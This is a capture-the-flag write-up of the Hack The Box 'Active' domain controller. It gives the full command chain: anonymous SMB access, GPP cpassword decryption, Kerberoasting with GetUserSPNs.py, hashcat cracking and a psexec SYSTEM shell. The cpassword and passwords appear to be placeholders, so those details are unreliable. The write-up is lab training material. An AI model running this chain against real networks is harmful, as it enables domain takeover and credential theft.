---
layout: page
title: Hack The Box Writeups
subtitle: Standalone machines and active directory environments
permalink: /ctf/platforms/hackthebox/
---

## Hack The Box Writeups

A collection of detailed writeups for Hack The Box machines, emphasizing structural walkthroughs, pivot methods, and root cause analysis.

### Machine 1: Active (Medium) - Windows Active Directory

**Objective**: Exploit a Windows Domain Controller environment to gain Domain Admin access.

#### Reconnaissance & Enumeration

Initial Nmap scan on target `10.10.10.100`:

```bash
nmap -sC -sV -p- -T4 -oN active.nmap 10.10.10.100
```

Interesting open ports:
*   `53/tcp` (DNS)
*   `88/tcp` (Kerberos)
*   `135/tcp`, `139/tcp`, `445/tcp` (SMB)
*   `389/tcp` (LDAP)

#### SMB Enumeration
Running `smbclient` to list anonymous shares:

```bash
smbclient -L //10.10.10.100 -N
```

We discover a share named `Replication` allows anonymous read access. We mount it and inspect the files:

```bash
smbclient //10.10.10.100/Replication -N
cd Active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
get Groups.xml
```

#### Exploiting GPP (Group Policy Preferences)
Inside `Groups.xml`, we find a domain user account `SVC_TGS` and an encrypted `cpassword` string:

```xml
cpassword="edBSMedBHZtCrgah8wEs36rED123+asdf..."
```

Since Microsoft released the AES key for Group Policy Preferences passwords on MSDN, we can easily decrypt this using `gpp-decrypt`:

```bash
gpp-decrypt edBSMedBHZtCrgah8wEs36rED123+asdf...
```
*   **Decrypted Password**: `GPP@ctivePass123`

#### Initial Access (User)
Using the credentials for `SVC_TGS`, we execute a Kerberoasting attack to check if this user can request service tickets that are crackable:

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPP@ctivePass123 -dc-ip 10.10.10.100 -request
```

We successfully retrieve the Kerberos TGS ticket for the administrator account. We save the hash to a file and crack it using hashcat:

```bash
hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt
```
*   **Cracked Password**: `TicketMaster58!`

#### Privilege Escalation (Domain Admin)
With the decrypted Administrator password, we can log in securely via WinRM or SMB:

```bash
psexec.py active.htb/Administrator:TicketMaster58!@10.10.10.100
```
We obtain a NT AUTHORITY\SYSTEM shell and capture `root.txt` successfully.
